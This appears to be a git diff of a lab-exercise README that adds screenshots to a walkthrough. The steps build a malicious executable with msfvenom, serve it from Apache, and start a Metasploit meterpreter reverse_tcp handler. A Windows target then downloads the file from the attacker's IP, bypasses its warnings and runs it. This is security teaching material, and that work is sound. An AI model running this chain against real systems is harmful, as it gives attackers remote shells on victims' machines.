@@ -69,30 +69,45 @@ Create a malicious executable file fun.exe using msenom command ``` msfvenom -p 
 
 ### Output:
 
+<img width="880" height="385" alt="Screenshot 2025-10-06 090020" src="https://github.com/user-attachments/assets/2f6a1c68-586e-4576-ba3e-49b9db8bd8aa" />
+<img width="839" height="164" alt="Screenshot 2025-10-06 090026" src="https://github.com/user-attachments/assets/2261b006-1772-4ae6-9b7a-db65d5b63741" />
 
 
 copy the fun.exe into the apache ```/var/www/html ```folder
 
+<img width="333" height="53" alt="Screenshot 2025-10-06 090346" src="https://github.com/user-attachments/assets/f78b21ec-0f04-4a33-9f80-cf46c91735eb" />
 
 
 Start apache server ```sudo systemctl apache2 start``` 
 
+<img width="349" height="55" alt="Screenshot 2025-10-06 090350" src="https://github.com/user-attachments/assets/78838929-378f-48f5-8145-950bcaf58482" />
 
 
 Check the status of apache2 ```sudo apache2 status```
 
+<img width="1909" height="563" alt="Screenshot 2025-10-06 090357" src="https://github.com/user-attachments/assets/1608f1ab-2625-4fd2-9e50-ed354babaf7a" />
 
 Invoke msfconsole:
 
+<img width="857" height="638" alt="Screenshot 2025-10-06 090523" src="https://github.com/user-attachments/assets/876009cb-6eff-4b0f-9a9c-a6596821b05f" />
+
+
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
+<img width="939" height="845" alt="Screenshot 2025-10-06 090530" src="https://github.com/user-attachments/assets/8c734900-ddd8-42dd-8464-1bbeeb68d59f" />
+
+
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
+
+<img width="805" height="260" alt="Screenshot 2025-10-06 090644" src="https://github.com/user-attachments/assets/57d5771f-ae11-4331-9745-c5fa85907250" />
+
 
 ### Output 
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
 
+<img width="1919" height="1139" alt="Screenshot 2025-10-06 090448" src="https://github.com/user-attachments/assets/0441c906-9b88-4b5c-83f7-3dd926a0eab7" />
 
 
 Bypass any warning boxes, double-click the file, and allow it to run.
